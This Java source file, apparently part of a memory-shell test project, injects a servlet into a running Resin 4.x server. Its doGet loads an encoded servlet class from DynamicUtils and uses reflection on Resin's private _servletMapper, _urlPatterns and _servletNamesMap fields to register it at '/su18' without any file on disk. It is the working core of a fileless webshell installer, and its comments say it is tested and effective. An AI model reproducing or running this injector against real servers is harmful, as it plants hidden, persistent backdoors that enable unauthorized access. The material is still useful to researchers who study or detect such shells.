package org.su18.memshell.test.resin;

import com.caucho.server.dispatch.ServletMapper;
import com.caucho.server.dispatch.ServletMapping;
import com.caucho.server.webapp.WebApp;

import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

import static org.su18.memshell.test.resin.DynamicUtils.SERVLET_CLASS_STRING;

/**
 * 来自文章 https://xz.aliyun.com/t/9639
 * 亲测有效
 * 测试版本 Resin 4.0.65
 *
 * @author su18
 */
public class AddResinServlet extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		try {

			String                          servletName = "su18ResinServlet";
			String                          servletUrl  = "/su18";
			com.caucho.server.webapp.WebApp web         = (com.caucho.server.webapp.WebApp) req.getServletContext();

			Servlet servlet = (Servlet) DynamicUtils.getClass(SERVLET_CLASS_STRING).newInstance();

			com.caucho.server.dispatch.ServletMapping mapping = new com.caucho.server.dispatch.ServletMapping();
			mapping.setServletClass(servlet.getClass().getName());
			mapping.setServletName(servletName);
			mapping.addURLPattern(servletUrl);
			web.addServletMapping(mapping);

			Field f = WebApp.class.getDeclaredField("_servletMapper");
			f.setAccessible(true);
			ServletMapper servletMapper = (ServletMapper) f.get(web);

			Field f2 = ServletMapper.class.getDeclaredField("_urlPatterns");
			f2.setAccessible(true);
			Map<String, Set<String>> map = (Map<String, Set<String>>) f2.get(servletMapper);
			HashSet<String>          set = new HashSet<>();
			set.add(servletUrl);

			map.put(servletName, set);

			Field f3 = ServletMapper.class.getDeclaredField("_servletNamesMap");
			f3.setAccessible(true);
			Map<String, ServletMapping> maps = (Map<String, ServletMapping>) f3.get(servletMapper);
			maps.put(servletUrl, mapping);

			resp.getWriter().println("Resin Servlet added");

		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}
